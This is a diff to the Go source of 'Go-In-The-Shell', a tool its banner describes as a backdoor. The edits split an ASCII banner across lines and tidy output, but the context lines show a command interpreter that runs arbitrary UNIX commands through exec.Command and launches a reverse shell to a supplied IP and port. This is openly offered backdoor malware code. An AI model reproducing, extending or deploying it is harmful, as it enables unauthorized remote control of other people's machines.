@@ -15,7 +15,10 @@ import (
 )
 
 func Banner() {
-	fmt.Println("\n,---.        |        --.--|            ,---.|         |    |    \n|  _.,---.   |,---.     |  |---.,---.   `---.|---.,---.|    |    \n|   ||   |---||   |---  |  |   ||---'---    ||   ||---'|    |    \n`---'`---'   ``   '     `  `   '`---'   `---'`   '`---'`---'`---'")
+	fmt.Println(",---.        |        --.--|            ,---.|         |    |    ")
+	fmt.Println("|  _.,---.   |,---.     |  |---.,---.   `---.|---.,---.|    |    ")
+	fmt.Println("|   ||   |---||   |---  |  |   ||---'---    ||   ||---'|    |    ")
+	fmt.Println("`---'`---'   ``   '     `  `   '`---'   `---'`   '`---'`---'`---'")
 	fmt.Println("\nGo-In-The-Shell is a flexible and userfriendly backdoor")
 	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
 	fmt.Println("For \"legally ok\" use only\n")
@@ -114,7 +117,6 @@ func InterpretCommand(command string) string {
 		return "Commands you can use are : help, set_backdoor <PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>\n"
 	} else if fields[0] == "command" {
 		payload := strings.TrimLeft(command, "command ")
-		fmt.Println(payload)
 		output_byte, _ := exec.Command(payload).Output()
 		output := fmt.Sprintf("%s", output_byte)
 		if fields[1] == "cd" {
@@ -125,7 +127,7 @@ func InterpretCommand(command string) string {
 		go reverse(fields[1])
 		return "good"
 	} else {
-		return "Unknown command try help"
+		return "Unknown command try help\n"
 	}
 }
 
